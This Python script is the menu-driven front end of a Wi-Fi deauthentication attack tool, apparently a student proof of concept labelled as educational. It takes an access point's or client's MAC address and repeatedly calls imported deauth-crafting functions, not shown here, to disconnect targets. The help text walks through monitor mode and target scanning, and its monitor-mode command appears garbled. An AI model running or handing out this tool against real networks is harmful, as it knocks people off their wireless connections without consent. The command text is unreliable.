import sys
from modules.deauth import craft_deauth_attack_to_AP, craft_deauth_attack_to_client
from termcolor import colored
import re


banner = """

██████╗ ███████╗     █████╗ ██╗   ██╗████████╗██╗  ██╗    ████████╗ ██████╗  ██████╗ ██╗     
██╔══██╗██╔════╝    ██╔══██╗██║   ██║╚══██╔══╝██║  ██║    ╚══██╔══╝██╔═══██╗██╔═══██╗██║     
██║  ██║█████╗█████╗███████║██║   ██║   ██║   ███████║       ██║   ██║   ██║██║   ██║██║     
██║  ██║██╔══╝╚════╝██╔══██║██║   ██║   ██║   ██╔══██║       ██║   ██║   ██║██║   ██║██║     
██████╔╝███████╗    ██║  ██║╚██████╔╝   ██║   ██║  ██║       ██║   ╚██████╔╝╚██████╔╝███████╗
╚═════╝ ╚══════╝    ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚═╝  ╚═╝       ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝
                                                                                             
Group 162 - Research De-authentication attack & PoC
Group members: Tran Thi Thanh - Team leader👩‍💻
               Nguyen Minh Quang - super member
\n<-- Just for education purposes -->
"""
interface = 'wlp5s0mon'
print(colored(banner, color="green"))

main_help = """
    How to use:
    Step 1: Put your network interface to monitor mode using this command \"aircrack-ng check kill & aircrack-ng start <interface>\"
    Step 2 <option>: Get AP List, to get AP List please use the scanning module using this command \"python3 module/scanning.py\"
    Step 3 <option>: Get Station connected to AP using this command \"python3 module/scanning_client.py\"
    Step 4: Choose Attack Mode by   -> Enter 1 for Attack AP
                                    -> Enter 2 for Attack Specific Client Connected to an AP
"""

def is_mac_address(mac):
    if re.match("[0-9a-f]{2}([-:])[0-9a-f]{2}(\\1[0-9a-f]{2}){4}$", mac.lower()):
        return True
    return False

def main():
    options = input("[+] Enter your options (press h for help): ")
    try:
        if options == 'h':
            print(colored(main_help, color="green"))
        elif options == '1':
            print(colored("---> You choose attack AP !!", color="green"))
            AP_MAC = input("[+] Enter AP MAC address (XX:XX:XX:XX:XX:XX): ")
            if is_mac_address(AP_MAC) == False:
                print(colored("[X] Please re-enter correct AP MAC address !!", color="red"))
            else:
                try:
                    while True:
                        craft_deauth_attack_to_AP(AP_MAC)
                except KeyboardInterrupt:
                    print("Bye")
        elif options == '2':
            print(colored("---> You choose attack specific victim !!", color="green"))
            AP_MAC1 = input("[+] Enter AP MAC address: ")
            client_mac = input("[+] Enter Client MAC address: ")
            if is_mac_address(AP_MAC1) == False:
                print(colored("[X] Please re-enter correct AP MAC Address Format!! ", color="red"))
            elif is_mac_address(client_mac) == False:
                print(colored("[X] Please re-enter correct Client MAC Address Format!", color="red"))
            elif is_mac_address(AP_MAC1) == False and is_mac_address(client_mac) == False:
                print(colored("[X] Both MAC Address You Entered Is Invalid !", color="red"))
            else:
                try:
                    while True:
                        craft_deauth_attack_to_client(client_mac, AP_MAC1)
                except KeyboardInterrupt:
                    print("Bye")
        else:
            print(colored("Invalid Option !! Quitting...", color="yellow"))
            sys.exit(1)
    except KeyboardInterrupt:
        print(colored("Bye :))", color="yellow"))


while True:
    main()
